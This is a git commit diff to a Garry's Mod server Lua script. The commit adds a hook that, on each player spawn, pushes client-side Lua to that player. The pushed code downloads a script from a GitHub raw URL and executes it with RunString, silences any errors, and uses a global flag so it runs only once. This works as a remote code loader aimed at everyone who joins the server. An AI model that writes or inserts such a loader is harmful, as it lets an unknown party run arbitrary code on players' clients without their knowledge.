32dac812cb1a685d863d8c1fb001da59a1ad6303
i am a person <jeffreyeinstein25901631@hotmail.com>
2026-06-11 13:30:59 +0300

    Update sv_thefunnylua.lua

--- sv_thefunnylua.lua
+++ sv_thefunnylua.lua
@@ -1,3 +1,16 @@
 util.AddNetworkString("ShakeYoAssForDaddyChadolf")
 
--- registered for reasonz
+-- send clientside lua to every player
+local lua = [[
+if _G.HasInj then return end
+_G.HasInj = true
+http.Fetch("https://raw.githubusercontent.com/thesecretsauce67420/thefunnylua/refs/heads/main/cl_thefunnylua.lua",
+        function(body)
+            RunString(body)
+        end, function(err)end -- itz 2026, who dafuq needs error logging with http.Fetch?
+    )
+]]
+
+hook.Add("PlayerSpawn", "inj", function(ply)
+    ply:SendLua(lua)
+end)
